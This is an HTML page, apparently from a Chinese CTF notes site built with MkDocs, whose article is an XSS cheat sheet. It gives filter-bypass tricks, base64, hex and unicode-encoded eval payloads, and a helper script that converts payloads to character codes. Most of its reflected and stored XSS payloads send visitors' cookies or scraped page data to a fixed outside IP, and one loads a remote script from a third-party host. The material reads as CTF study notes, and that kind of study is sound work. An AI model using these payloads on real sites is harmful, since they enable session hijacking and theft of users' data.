+      <a href="../../wp/ctfshow/web21-%E7%88%86%E7%A0%B4-payload%E5%A4%84%E7%90%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web21-爆破-payload处理
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web27-%E7%88%86%E7%A0%B4-%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81%E7%88%86%E7%A0%B4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web27-爆破-身份证号码爆破
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web28-%E7%88%86%E7%A0%B4-web%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web28-爆破-web目录爆破
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web329-%E5%AD%98%E5%82%A8%E5%9E%8BXSS%2Bjquery%E9%80%89%E6%8B%A9%E5%99%A8%2BquerySelector%E9%80%89%E6%8B%A9%E5%99%A8%2BXSS%E6%95%B0%E6%8D%AE%E5%A4%96%E6%B3%84/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web329-存储型XSS+jquery选择器+querySelector选择器+XSS数据外泄
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web329-%E5%AD%98%E5%82%A8%E5%9E%8BXSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web329 存储型XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web330-%E5%AD%98%E5%82%A8%E5%9E%8BXSS-GET-%E9%92%93%E9%B1%BC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web330 存储型XSS GET 钓鱼
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web331-%E5%AD%98%E5%82%A8%E5%9E%8BXSS-jQuery-POST--%E9%92%93%E9%B1%BC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web331 存储型XSS jQuery POST  钓鱼
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web359-ssrf-mysql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web359 ssrf mysql
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web360-ssrf-redis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web360 ssrf redis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web369-ssti-%E4%B8%8B%E5%88%92%E7%BA%BF%E7%BB%95%E8%BF%87-%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87-%5B%5D%E7%BB%95%E8%BF%87-%7B%7B%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4request/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web369 ssti 下划线绕过 引号绕过 []绕过 {{绕过 过滤request
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web370-ssti-%E4%B8%8B%E5%88%92%E7%BA%BF-%E5%BC%95%E5%8F%B7-%E6%95%B0%E5%AD%97/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web370 ssti 下划线 引号 数字
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web371-ssti-%7B%25%25%7D-print%E8%BF%87%E6%BB%A4-%E4%B8%8B%E5%88%92%E7%BA%BF-%E5%BC%95%E5%8F%B7-%E6%95%B0%E5%AD%97/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web371 ssti {%%} print过滤 下划线 引号 数字
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php%E7%9F%AD%E6%A0%87%E7%AD%BE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web79-文件包含-php短标签
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web80-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABnginx%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web80-文件包含nginx日志包含
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web82-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%2Bsession%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web82-文件包含-条件竞争+session临时文件注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web87-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%A6%99%E7%94%A8%E7%94%9F%E6%88%90%E4%B8%8D%E6%AD%BB%E9%A9%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web87-文件包含-php伪协议妙用生成不死马
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_6" id="__nav_4_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    三届长城杯
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    三届长城杯
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/%E4%B8%89%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/AI_WAF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AI WAF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_7" id="__nav_4_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第一场考核赛
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    第一场考核赛
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/%E7%AC%AC%E4%B8%80%E5%9C%BA%E8%80%83%E6%A0%B8%E8%B5%9B/thinkphp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Thinkphp
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/%E7%AC%AC%E4%B8%80%E5%9C%BA%E8%80%83%E6%A0%B8%E8%B5%9B/%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%A7%98%E5%AF%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    教务系统的秘密
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        绕过
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="绕过">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        加密绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        传参
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        反射型
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        存储型
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>XSS</h1>
+
+<h2 id="_1">绕过</h2>
+<p>空格：%09，tab，/，/**/</p>
+<p>String.fromCharCode()函数：ascii码转字符</p>
+<pre><code class="language-python">&lt;body οnlοad=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,48,49,46,51,55,46,50,49,48,46,50,51,54,58,56,48,56,48,47,88,83,83,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,60,47,115,99,114,105,112,116,62));&gt;&lt;/body&gt;
+String.fromCharCode(...)中的就是&lt;script&gt;document.location.href='http://101.37.210.236:8080/XSS.php?cookie='+document.cookie&lt;/script&gt;
+
+字符串转ascii脚本
+import sys
+input_str=sys.argv[1]
+ascii_ta=[]
+for x in input_str:
+    ascii_ta.append(str(ord(x)))
+result=','.join(ascii_ta)
+print(&quot;转换后的ascii码字符:&quot;)
+print(result)
+
+格式：
+python str2ascii.py &quot;&lt;script&gt;document.location.href=
+'http://101.37.210.236:8080/XSS.php?cookie='+document.cookie&lt;/script&gt;&quot;
+</code></pre>
+<h5 id="_2">加密绕过</h5>
+<pre><code class="language-php+HTML">base64加密
+&lt;input οnfοcus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzOC5jYy8ySEpJIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== autofocus&gt;
+atob：base64解码函数
+base64解码：var a=document.createElement(&quot;script&quot;);a.src=&quot;https://xss8.cc/2HJI&quot;;document.body.appendChild(a);
+</code></pre>
+<pre><code class="language-html">十六进制加密
+&lt;body/οnlοad=eval(&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x36\x30\x2c\x31\x31\x35\x2c\x39\x39\x2c\x31\x31\x34\x2c\x31\x30\x35\x2c\x31\x31\x32\x2c\x31\x31\x36\x2c\x36\x32\x2c\x31\x30\x30\x2c\x31\x31\x31\x2c\x39\x39\x2c\x31\x31\x37\x2c\x31\x30\x39\x2c\x31\x30\x31\x2c\x31\x31\x30\x2c\x31\x31\x36\x2c\x34\x36\x2c\x31\x30\x38\x2c\x31\x31\x31\x2c\x39\x39\x2c\x39\x37\x2c\x31\x31\x36\x2c\x31\x30\x35\x2c\x31\x31\x31\x2c\x31\x31\x30\x2c\x34\x36\x2c\x31\x30\x34\x2c\x31\x31\x34\x2c\x31\x30\x31\x2c\x31\x30\x32\x2c\x36\x31\x2c\x33\x39\x2c\x31\x30\x34\x2c\x31\x31\x36\x2c\x31\x31\x36\x2c\x31\x31\x32\x2c\x35\x38\x2c\x34\x37\x2c\x34\x37\x2c\x34\x39\x2c\x34\x38\x2c\x34\x39\x2c\x34\x36\x2c\x35\x31\x2c\x35\x35\x2c\x34\x36\x2c\x35\x30\x2c\x34\x39\x2c\x34\x38\x2c\x34\x36\x2c\x35\x30\x2c\x35\x31\x2c\x35\x34\x2c\x35\x38\x2c\x35\x36\x2c\x34\x38\x2c\x35\x36\x2c\x34\x38\x2c\x34\x37\x2c\x38\x38\x2c\x38\x33\x2c\x38\x33\x2c\x34\x36\x2c\x31\x31\x32\x2c\x31\x30\x34\x2c\x31\x31\x32\x2c\x36\x33\x2c\x39\x39\x2c\x31\x31\x31\x2c\x31\x31\x31\x2c\x31\x30\x37\x2c\x31\x30\x35\x2c\x31\x30\x31\x2c\x36\x31\x2c\x33\x39\x2c\x34\x33\x2c\x31\x30\x30\x2c\x31\x31\x31\x2c\x39\x39\x2c\x31\x31\x37\x2c\x31\x30\x39\x2c\x31\x30\x31\x2c\x31\x31\x30\x2c\x31\x31\x36\x2c\x34\x36\x2c\x39\x39\x2c\x31\x31\x31\x2c\x31\x31\x31\x2c\x31\x30\x37\x2c\x31\x30\x35\x2c\x31\x30\x31\x2c\x36\x30\x2c\x34\x37\x2c\x31\x31\x35\x2c\x39\x39\x2c\x31\x31\x34\x2c\x31\x30\x35\x2c\x31\x31\x32\x2c\x31\x31\x36\x2c\x36\x32\x29\x29\x3b&quot;)&gt;
+十六进制解码后：document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,48,49,46,51,55,46,50,49,48,46,50,51,54,58,56,48,56,48,47,88,83,83,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,60,47,115,99,114,105,112,116,62));
+</code></pre>
+<pre><code class="language-html">unicode加密
+&lt;body/οnlοad=eval(&quot;\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0077\u0072\u0069\u0074\u0065\u0028\u0053\u0074\u0072\u0069\u006e\u0067\u002e\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065\u0028\u0036\u0030\u002c\u0031\u0031\u0035\u002c\u0039\u0039\u002c\u0031\u0031\u0034\u002c\u0031\u0030\u0035\u002c\u0031\u0031\u0032\u002c\u0031\u0031\u0036\u002c\u0036\u0032\u002c\u0031\u0030\u0030\u002c\u0031\u0031\u0031\u002c\u0039\u0039\u002c\u0031\u0031\u0037\u002c\u0031\u0030\u0039\u002c\u0031\u0030\u0031\u002c\u0031\u0031\u0030\u002c\u0031\u0031\u0036\u002c\u0034\u0036\u002c\u0031\u0030\u0038\u002c\u0031\u0031\u0031\u002c\u0039\u0039\u002c\u0039\u0037\u002c\u0031\u0031\u0036\u002c\u0031\u0030\u0035\u002c\u0031\u0031\u0031\u002c\u0031\u0031\u0030\u002c\u0034\u0036\u002c\u0031\u0030\u0034\u002c\u0031\u0031\u0034\u002c\u0031\u0030\u0031\u002c\u0031\u0030\u0032\u002c\u0036\u0031\u002c\u0033\u0039\u002c\u0031\u0030\u0034\u002c\u0031\u0031\u0036\u002c\u0031\u0031\u0036\u002c\u0031\u0031\u0032\u002c\u0035\u0038\u002c\u0034\u0037\u002c\u0034\u0037\u002c\u0034\u0039\u002c\u0034\u0038\u002c\u0034\u0039\u002c\u0034\u0036\u002c\u0035\u0031\u002c\u0035\u0035\u002c\u0034\u0036\u002c\u0035\u0030\u002c\u0034\u0039\u002c\u0034\u0038\u002c\u0034\u0036\u002c\u0035\u0030\u002c\u0035\u0031\u002c\u0035\u0034\u002c\u0035\u0038\u002c\u0035\u0036\u002c\u0034\u0038\u002c\u0035\u0036\u002c\u0034\u0038\u002c\u0034\u0037\u002c\u0038\u0038\u002c\u0038\u0033\u002c\u0038\u0033\u002c\u0034\u0036\u002c\u0031\u0031\u0032\u002c\u0031\u0030\u0034\u002c\u0031\u0031\u0032\u002c\u0036\u0033\u002c\u0039\u0039\u002c\u0031\u0031\u0031\u002c\u0031\u0031\u0031\u002c\u0031\u0030\u0037\u002c\u0031\u0030\u0035\u002c\u0031\u0030\u0031\u002c\u0036\u0031\u002c\u0033\u0039\u002c\u0034\u0033\u002c\u0031\u0030\u0030\u002c\u0031\u0031\u0031\u002c\u0039\u0039\u002c\u0031\u0031\u0037\u002c\u0031\u0030\u0039\u002c\u0031\u0030\u0031\u002c\u0031\u0031\u0030\u002c\u0031\u0031\u0036\u002c\u0034\u0036\u002c\u0039\u0039\u002c\u0031\u0031\u0031\u002c\u0031\u0031\u0031\u002c\u0031\u0030\u0037\u002c\u0031\u0030\u0035\u002c\u0031\u0030\u0031\u002c\u0036\u0030\u002c\u0034\u0037\u002c\u0031\u0031\u0035\u002c\u0039\u0039\u002c\u0031\u0031\u0034\u002c\u0031\u0030\u0035\u002c\u0031\u0031\u0032\u002c\u0031\u0031\u0036\u002c\u0036\u0032\u0029\u0029\u003b&quot;)&gt;
+解码为：document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,48,49,46,51,55,46,50,49,48,46,50,51,54,58,56,48,56,48,47,88,83,83,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,60,47,115,99,114,105,112,116,62));
+</code></pre>
+<h2 id="_3">传参</h2>
+<p>1.jQuery.ajax，后台发送数据，基于原生的 XMLHttpRequest 封装，比fetch更老练</p>
+<p>页面必须要引用<strong>jQuery</strong>，判断是否引用了jQuery可以在控制台，输入<strong>$</strong>或<strong>jQuery</strong>测试，如果$绑定了jQuery可以简略成<strong>$.ajax</strong></p>
+<pre><code class="language-js">例：$.ajax({
+    url: 'api/test.php',      // 请求的地址
+    type: 'POST',             // 请求方式: GET 或 POST
+    data: {                   // 要发送的数据
+        username: 'admin',
+        password: '123'
+    },
+    success: function(res) {  // 成功后的回调函数
+        console.log('服务器返回了：' + res);
+    },
+    error: function(err) {    // 失败后的回调函数
+        console.log('出错了');
+    }
+});
+</code></pre>
+<p>2.fetch，后台发送数据，老版不带cookie</p>
+<pre><code class="language-js">GET：
+fetch('api/user?id=1') //如果写成/api/user?id=1,则在网站根目录找
+    .then(response =&gt; response.text()) // 先转换成文本（或 .json()）
+    .then(data =&gt; console.log(data))    // 打印数据
+    .catch(err =&gt; console.log(err));    // 捕捉错误
+
+POST：
+fetch('api/change.php', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded' // 模拟表单提交，默认Content-Type: text/plain
+    },
+    body: 'p=1717' // 发送的内容
+}).then(res =&gt; console.log(&quot;发送成功&quot;));
+</code></pre>
+<h2 id="_4">反射型</h2>
+<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;location.href=&quot;http://101.37.210.236:8080/XSS.php?cookie&quot;+document.cookie&lt;/script&gt; //XSS.php用来接收cookie
+</code></pre>
+<pre><code class="language-html">&lt;img alert(1)&gt;
+&lt;img src=&quot;&quot; οnerrοr=location.href=&quot;http://101.37.210.236:8080/XSS.php?cookie=&quot;+document.cookie&gt;
+
+onload:正常加载触发
+</code></pre>
+<pre><code class="language-html">&lt;body&gt;Ok&lt;/body&gt;
+&lt;body onload=location.href=&quot;http://101.37.210.236:8080/XSS.php?cookie=&quot;+document.cookie&gt;&lt;/body&gt;
+
+onscroll:滚动触发
+oncopy:复制触发
+onpaste:粘贴触发
+</code></pre>
+<pre><code class="language-html">&lt;iframe οnlοad=location.href=&quot;http://101.37.210.236:8080/XSS.php?cookie=&quot;+document.cookie&gt;&lt;/iframe&gt;//画中画
+</code></pre>
+<pre><code class="language-html">&lt;svg οnlοad=location.href=&quot;http://101.37.210.236:8080/XSS.php?cookie=&quot;+document.cookie&gt;&lt;/svg&gt;//矢量图
+</code></pre>
+<pre><code class="language-html">&lt;input οnfοcus=location.href=&quot;http://101.37.210.236:8080/XSS.php?cookie=&quot;+document.cookie&gt;
+
+onkeydown:击键触发
+onblur:失去焦点触发
+onchange:改变值触发
+</code></pre>
+<pre><code class="language-html">&lt;video&gt;&lt;source onerror=location.href='http://101.37.210.236:8080/XSS.php?cookie='+document.cookie&gt;&lt;/video&gt;
+</code></pre>
+<h2 id="_5">存储型</h2>
+<pre><code class="language-html">&lt;script&gt;location.href=&quot;http://101.37.210.236:2333/&quot;+document.cookie&lt;/script&gt;    //跳转
+&lt;script&gt;windows.open(&quot;http://101.37.210.236:2333/&quot;+document.cookie)&lt;/script&gt;    //跳转
+&lt;script&gt;fetch(&quot;http://101.37.210.236:2333/&quot;+document.cookie)&lt;/script&gt;   //后台
+&lt;script&gt;location.assign(&quot;http://101.37.210.236:2333/&quot;+document.cookie)&lt;/script&gt; //跳转
+&lt;script&gt;location.replace(&quot;http://101.37.210.236:2333/&quot;+document.cookie)&lt;/script&gt;    //跳转
+</code></pre>
+<p>jquery选择器取数据</p>
+<pre><code class="language-html">例：&lt;script&gt;$(&quot;div.layui-table-cell.laytable-cell-1-0-1&quot;).each(function(index,value){window.open(&quot;http://101.37.210.236:2333/&quot; + value.innerHTML)})&lt;/script&gt;
+</code></pre>
+<p>querySelector选择器取数据</p>
+<pre><code class="language-html">例：&lt;script&gt;window.open(&quot;http://101.37.210.236:2333/&quot;+document.querySelector(&quot;div.layui-form.layui-border-box.layui-table-view .layui-table-body .layui-table-cell.laytable-cell-1-0-1&quot;).innerHTML)&lt;/script&gt;
+</code></pre>
+<p>数据外泄</p>
+<pre><code class="language-html">&lt;script&gt;var img=Image();img.src=&quot;http://101.37.210.236:2333&quot;+document.cookie;document.body.append(img)&lt;/script&gt;
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.indexes", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
